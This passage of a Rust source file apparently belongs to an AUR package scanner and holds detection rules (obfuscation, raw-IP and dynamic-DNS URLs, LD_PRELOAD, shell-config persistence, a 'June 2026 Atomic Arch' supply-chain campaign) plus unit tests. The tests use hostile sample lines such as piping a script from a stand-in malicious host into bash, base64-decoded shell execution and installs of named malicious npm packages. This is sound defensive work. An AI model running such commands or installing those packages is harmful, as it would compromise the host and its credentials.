            patterns: vec![Pattern::Regex {
                pattern: r"\beval\s+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Avoid eval; use direct commands instead".to_string(),
            cwe_id: Some("CWE-95".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-003".to_string(),
            name: "Hex-encoded payload".to_string(),
            description: "Hex encoding can hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\\x[0-9a-fA-F]{2}".to_string(),
                },
                Pattern::Regex {
                    pattern: r"xxd\s+-r".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review hex-encoded content".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-004".to_string(),
            name: "String concatenation obfuscation".to_string(),
            description: "Concatenating strings to hide commands".to_string(),
            severity: Severity::Medium,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r#"\$\{[a-z]\}.*\$\{[a-z]\}.*\$\{[a-z]\}"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review concatenated strings carefully".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "OBF-005".to_string(),
            name: "Gzip decode execution".to_string(),
            description: "Decompressing and executing payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(gzip|gunzip|zcat)\s+.*\|\s*(ba)?sh".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64.*\|\s*(gzip|gunzip)\s+.*\|\s*(ba)?sh".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decompress and review content before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // ============================================================
        // HIGH: Suspicious URLs and Sources
        // ============================================================
        Rule {
            id: "URL-001".to_string(),
            name: "Raw IP in URL".to_string(),
            description: "URLs with raw IP addresses are suspicious".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![Pattern::Regex {
                pattern: r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Use domain names from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "URL-002".to_string(),
            name: "URL shortener".to_string(),
            description: "URL shorteners can hide malicious destinations".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(bit\.ly|tinyurl|t\.co|goo\.gl|is\.gd|v\.gd|shorte\.st|adf\.ly)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Always use full URLs from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "URL-003".to_string(),
            name: "Dynamic DNS domain".to_string(),
            description: "Dynamic DNS domains are often used for malware C2".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.(duckdns|no-ip|dynu|freedns|afraid)\.".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.(ddns|hopto|zapto|sytes|serveftp)\.".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Dynamic DNS domains are suspicious in packages".to_string(),
            cwe_id: None,
            enabled: true,
        },
        // NOTE: insecure transport (git://, git+http://, http://, ftp://) and
        // weak checksums (md5/sha1) are intentionally NOT pattern rules. They
        // are owned by the source analyzer (SRC-001) and checksum analyzer
        // (CHK-002/CHK-003) respectively, which parse the source/checksum arrays
        // structurally. Keeping a single owner per concept keeps finding IDs
        // unique and auditable (see the `catalog` module).

        // ============================================================
        // HIGH: Hidden Files and Suspicious Paths
        // ============================================================
        Rule {
            id: "HIDDEN-001".to_string(),
            name: "Hidden file creation in home".to_string(),
            description: "Creating hidden files in user home directory".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.[^/]+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.[^/]+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not create hidden files in user home".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "HIDDEN-002".to_string(),
            name: "Tmp directory execution".to_string(),
            description: "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/tmp/[^\s]+\s*$".to_string(),
                },
                Pattern::Regex {
                    pattern: r"chmod\s+\+x\s+/tmp/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not execute from /tmp".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "HIDDEN-003".to_string(),
            name: "Binary in non-standard location".to_string(),
            description: "Placing binaries in /usr/local/share or ~/.local/share. Used by CHAOS RAT.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(cp|mv|install).*(/usr/local/share|~/.local/share)/[^/]+\.(bin|elf|py|sh)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Binaries should be placed in standard locations".to_string(),
            cwe_id: None,
            enabled: true,
        },

        // ============================================================
        // HIGH: Environment Manipulation
        // ============================================================
        Rule {
            id: "ENV-001".to_string(),
            name: "LD_PRELOAD manipulation".to_string(),
            description: "LD_PRELOAD can be used to inject malicious libraries".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"LD_PRELOAD\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/ld\.so\.preload".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "LD_PRELOAD manipulation is extremely suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
        },
        Rule {
            id: "ENV-002".to_string(),
            name: "PATH manipulation".to_string(),
            description: "Modifying PATH to hijack commands".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"export\s+PATH\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r#"PATH\s*=\s*["']?[^\$]"#.to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "PATH manipulation in install scripts is suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
        },
        Rule {
            id: "ENV-003".to_string(),
            name: "Bashrc/profile modification".to_string(),
            description: "Modifying shell config for persistence".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.(bashrc|bash_profile|profile|zshrc)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/(bash\.bashrc|profile|zsh/)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify shell configuration".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // INFO/LOW: Package Metadata Warnings
        // ============================================================
        Rule {
            id: "META-001".to_string(),
            name: "Provides impersonation".to_string(),
            description: "Package provides another package name, may be impersonating. CHAOS RAT used this technique.".to_string(),
            severity: Severity::Low,
            category: Category::SuspiciousMetadata,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"^provides=".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild],
            recommendation: "Verify this package is a legitimate alternative".to_string(),
            cwe_id: None,
            enabled: true,
        },

        // ============================================================
        // CRITICAL: "Atomic Arch" supply-chain campaign (June 2026)
        // Orphaned AUR packages were adopted and their PKGBUILD/install
        // hooks modified to pull malicious npm/bun packages
        // (atomic-lockfile, js-digest, lockfile-js) that drop a
        // credential stealer and an eBPF rootkit (scales.bpf.c).
        // ============================================================
        Rule {
            id: "ATOMIC-001".to_string(),
            name: "Atomic Arch malicious npm/bun package".to_string(),
            description: "References a known-malicious package from the June 2026 'Atomic Arch' AUR supply-chain campaign (atomic-lockfile, js-digest, lockfile-js). These pull an infostealer and eBPF rootkit during the build/install phase.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                pattern: r"\b(atomic-lockfile|js-digest|lockfile-js)\b".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do NOT build. This is a known-malicious dependency. Remove the package and treat the host as compromised: rotate credentials (SSH, npm/GitHub tokens, browser sessions).".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "ATOMIC-002".to_string(),
            name: "Node/Bun package manager in install hook".to_string(),
            description: "Invokes npm/pnpm/yarn/bun to install packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch npm/bun packages during the install phase.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i)\b".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\bbunx?\s+(install|add|i|x)\b".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "ATOMIC-003".to_string(),
            name: "eBPF rootkit / payload artifact".to_string(),
            description: "References the eBPF rootkit object (scales.bpf.c) or the 'deps' hook path used by the June 2026 'Atomic Arch' payload to gain rootkit-like capabilities and hide itself.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"scales\.bpf\.c".to_string(),
                },
                Pattern::Regex {
                    pattern: r"src/hooks/deps\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "This is a rootkit dropper artifact. Do not build; treat the host as compromised and reinstall rather than clean.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_rules() {
        let engine = RuleEngine::default();
        assert!(engine.rule_count() > 0);
    }

    #[test]
    fn test_all_builtin_rules_compile() {
        // Regression guard: every built-in rule must compile and load. A bad
        // pattern previously aborted the whole load via `?`, silently disabling
        // every rule defined after it. Assert the full set is present.
        //
        // Use a built-ins-ONLY engine here, not RuleEngine::default(): default()
        // also loads community rule files from user_rule_dirs(), so any machine
        // with a community rule installed (e.g. the shipped example.toml in
        // /usr/share/aur-scanner/rules.d/) would otherwise inflate the count and
        // fail this test for the wrong reason.
        let expected = get_builtin_rules();
        let mut engine = RuleEngine::new();
        engine
            .add_builtin_rules()
            .expect("built-in rules must all load");
        for rule in &expected {
            assert!(
                engine.get_rule(&rule.id).is_some(),
                "built-in rule {} failed to load (bad regex?)",
                rule.id
            );
        }
        assert_eq!(engine.rule_count(), expected.len());
    }

    #[test]
    fn test_match_curl_bash() {
        let engine = RuleEngine::default();
        let content = "curl https://malicious.com/script.sh | bash";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].rule_id, "DLE-001");
    }

    #[test]
    fn test_match_base64() {
        let engine = RuleEngine::default();
        let content = "echo 'payload' | base64 -d | sh";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "OBF-001"));
    }

    #[test]
    fn test_no_false_positive() {
        let engine = RuleEngine::default();
        let content = "make && make install";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_install004_language_pkg_managers_in_install_hook() {
        let engine = RuleEngine::default();
        for s in [
            "pip install requests",
            "pip3 install --user evil",
            "poetry add malware",
            "uv pip install x",
            "pdm add y",
            "cargo install backdoor",
            "go install evil.example/x@latest",
            "gem install z",
            "deno run https://evil/x.ts",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(m.iter().any(|x| x.rule_id == "INSTALL-004"), "missed: {s}");
        }
    }

    #[test]
    fn test_install004_not_in_pkgbuild_build() {
        // Building a node/python project in build() legitimately runs these;
        // INSTALL-004 is scoped to install hooks only.
        let engine = RuleEngine::default();
        let m = engine.match_content("pip install .", FileType::Pkgbuild);
        assert!(!m.iter().any(|x| x.rule_id == "INSTALL-004"));
    }

    #[test]
    fn test_heredoc_message_not_flagged() {
        // A post_install message printed via `cat <<EOF` mentions ~/.zshrc but
        // does not modify it; ENV-003/HIDDEN-001 must not fire.
        let engine = RuleEngine::default();
        let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(
            !matches.iter().any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
            "heredoc message should not trigger path rules: {matches:?}"
        );
    }

    #[test]
    fn test_redirected_heredoc_still_scanned() {
        // Writing into ~/.zshrc via a redirected heredoc IS a real modification.
        let engine = RuleEngine::default();
        let content = "cat <<EOF >> ~/.zshrc\nsource /tmp/evil\nEOF";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ENV-003"));
    }

    #[test]
    fn test_match_atomic_malicious_package() {
        let engine = RuleEngine::default();
        // Wave 1 (npm) and wave 2 (bun) IOC package names.
        for content in [
            "npm install atomic-lockfile",
            "bun install js-digest",
            "yarn add lockfile-js",
        ] {
            let matches = engine.match_content(content, FileType::Pkgbuild);
            assert!(
                matches.iter().any(|m| m.rule_id == "ATOMIC-001"),
                "expected ATOMIC-001 for: {content}"
            );
        }
    }

    #[test]
    fn test_match_atomic_pkgmanager_in_install_hook() {
        let engine = RuleEngine::default();
        let content = "post_install() {\n    npm install atomic-lockfile\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
        // bun variant
        let matches = engine.match_content("bun install js-digest", FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }

    #[test]
    fn test_match_atomic_ebpf_artifact() {
        let engine = RuleEngine::default();
        let matches = engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-003"));
    }

    #[test]
    fn test_atomic_no_false_positive_on_legit_node_build() {
        let engine = RuleEngine::default();
        // npm in a PKGBUILD build() is common for legit node packages and must
        // NOT trigger ATOMIC-002 (which is scoped to install scripts only).
        let matches = engine.match_content("npm install --offline", FileType::Pkgbuild);
        assert!(!matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }
}
